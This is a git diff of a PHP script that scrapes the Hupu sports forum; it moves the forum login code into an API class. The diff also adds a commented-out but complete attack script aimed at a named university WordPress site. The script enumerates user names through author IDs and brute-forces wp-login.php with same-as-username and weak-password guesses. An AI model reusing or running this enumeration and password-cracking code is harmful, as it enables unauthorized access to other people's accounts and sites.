@@ -1,4 +1,5 @@
 <?php
+
 require_once 'API.php';
 require_once 'Curl.class.php';
 require_once 'simple_html_dom.php';
@@ -8,7 +9,7 @@ $type=$_GET['type'];
 $bbsType=$_GET['bbstype'];
 $uname=$_GET['uname'];
 $pwd=$_GET['pwd'];
-$cookie_file="./cookie.txt";
+
 if($item=="voice"){
 	echo json_encode(HupoAPI::getItemVoice($type));
 }
@@ -18,45 +19,13 @@ if($item=="bbs"){
 if($item=="page"){
 	echo print_r(HupoAPI::getBBSPage("http://bbs.hupu.com/9222995.html"));
 }
-if($item=="entry"){
-	$option=array(
-	"url"=>"http://passport.hupu.com/login?from=myIndex",
-	"folocation"=>true,
-	"timeOut"=>4,
-	"maxRed"=>4,
-	"noBody"=>false,
-	"includeHeader"=>false,
-	"binaryTrans"=>false
-	);
-	$postData=array(
-	"username"=>$uname,
-	"password"=>$pwd,
-	"rememberme"=>1
-	);
-	$curl = new CurlUtil($option);
-	$curl->setPost($postData);
-	$curl->setCookieFileLocation($uname);
-	$curl->createCURL();
-	if($curl->getHttpStatus()<400){
-		echo "entry";
-	}else{
-		echo "error";
-	}
+if($item=="login"){
+	echo HupoAPI::login($uname,$pwd);
 }
-if($item=="upload"){
-	$cookie_file="./".$uname.".txt";
-	$ch=curl_init();
-	$url="http://bbs.hupu.com";
-	curl_setopt($ch, CURLOPT_URL, $url);
-	curl_setopt($ch, CURLOPT_HEADER, 0);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_COOKIEFILE,$cookie_file);
-	$page=curl_exec($ch);
-	curl_close($ch);
-	$html = new simple_html_dom();
-	$html->load($page);
-	echo $html->find('ul[id=myforums_list] li a ',1)->innertext;
+if($item=="loged"){
+	echo HupoAPI::getLogedHtml(943212499,"http://bbs.hupu.com")->find("ul[id=myforums_list] li a ",5)->innertext;
 }
+
 /*
 $option=array(
 	"url"=>"http://passport.hupu.com/login?from=myIndex",
@@ -83,5 +52,86 @@ $userUrl=$html->find(".hasLogin .userImports a")->href;
 echo $userUrl;
 //$myHtml = file_get_html($userUrl);
 //echo $myHtml->find(".personal .mpersonal div");
-*/
+/*
+set_time_limit(0);
+$domain = "arch.nedu.edu.cn";
+
+//enumerate username
+for ($i=1; $i <= 1000; $i++) {
+
+    $url = $domain."/?author=".$i;
+    $response = httprequest($url,0);
+    if ($response == 404) {
+        continue;
+    }
+    $pattern = "/author\/(.*)\/feed/";
+    preg_match($pattern, $response, $name);
+    $namearray[] = $name[1];
+}
+print_r($namearray);
+
+echo "totally got".count($namearray)."users\n";
+
+echo "attempting same username&password：\n";
+
+$crackname = crackpassword($namearray,"same");
+
+$passwords = file("pass.txt");
+
+echo "attempting weak password：\r\n";
+
+if ($crackname) {
+    $namearray = array_diff($namearray,$crackname);
+}
+
+crackpassword($namearray,$passwords);
+
+function crackpassword($namearray,$passwords){
+    global $domain;
+    $crackname = "";
+    foreach ($namearray as $name) {
+        $url = $domain."/wp-login.php";
+        if ($passwords == "same") {
+            $post = "log=".urlencode($name)."&pwd=".urlencode($name)."&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=".urlencode($domain)."%2Fwp-admin%2F&testcookie=1";
+            $pos = strpos(httprequest($url,$post),'div id="login_error"');
+            if ($pos === false) {
+                echo "$name $name"."\n";
+                $crackname[] = $name;
+            }
+        }else{
+            foreach ($passwords as $pass) {
+                $post = "log=".urlencode($name)."&pwd=".urlencode($pass)."&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=".urlencode($domain)."%2Fwp-admin%2F&testcookie=1";
+                $pos = strpos(httprequest($url,$post),'div id="login_error"');
+                if ($pos === false) {
+                    echo "$name $pass"."\n";
+                }
+            }
+        }
+    }
+    return $crackname;
+}
+
+function httprequest($url,$post){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "$url");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
+
+    if($post){
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+    }
+
+    $output = curl_exec($ch);
+    $httpcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($httpcode == 404) {
+        return 404;
+    }else{
+        return $output;
+    }
+}
+?>*/
 ?>
